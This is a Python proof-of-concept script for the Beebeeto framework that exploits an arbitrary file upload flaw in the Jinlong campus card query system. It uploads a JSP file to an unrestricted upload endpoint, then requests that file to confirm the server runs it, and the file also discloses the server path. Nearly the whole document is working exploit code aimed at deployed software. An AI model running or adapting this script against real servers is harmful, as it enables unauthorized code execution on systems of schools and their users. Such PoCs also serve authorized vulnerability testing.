#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import time
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0151',
            'name': '金龙卡金融化一卡通校园卡查询系统任意文件上传 漏洞 POC',
            'author': 'AZONE',
            'create_date': '2014-11-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '金融化一卡通系统',
            'vul_version': ['*'],
            'type': 'File Upload',
            'tag': ['金龙卡漏洞', '/pages/xxfb/editor/uploadAction.action', 'File Upload', 'jsp'],
            'desc': '''
                    http://xxx.xxx.xxx/pages/xxfb/editor/uploadAction.action
                    post:
                    <input name="file" value="浏览" id="file" type="file">
                    可上传文件,未限制上传文件类型,导致任意文件上传漏洞。
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-075840',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        target_url = args['options']['target'] + "/pages/xxfb/editor/uploadAction.action"
        file_v_jsp = '''<%@ page import="java.util.*,java.io.*" %>
        <%@ page import="java.io.*"%>
        <%
        String path=application.getRealPath(request.getRequestURI());
        File d=new File(path);
        out.println(path);
        %>
        <% out.println("0a12184d25062e5f");%>
        '''
        files = {'file': ('payload.jsp', file_v_jsp, 'text/plain')}

        if args['options']['verbose']:
            print '[*] Request URL: ' + target_url

        response = requests.post(target_url, files=files) # 上传
        content = response.content

        regular = re.compile('/noticespic/.*jsp')
        url_back = regular.findall(content)
        if url_back:
            verify_url = verify_url+url_back[0]
            print '[!] File Uploaded:',verify_url
            time.sleep(5) #不加会出错哦，可能是上一个上传还没完成，就去请求的时候导致数据出错了
            req = requests.get(verify_url)
            content = req.content
            if '0a12184d25062e5f' in content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
                return args
            args['success'] = False
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint
    mp = MyPoc()
    pprint(mp.run())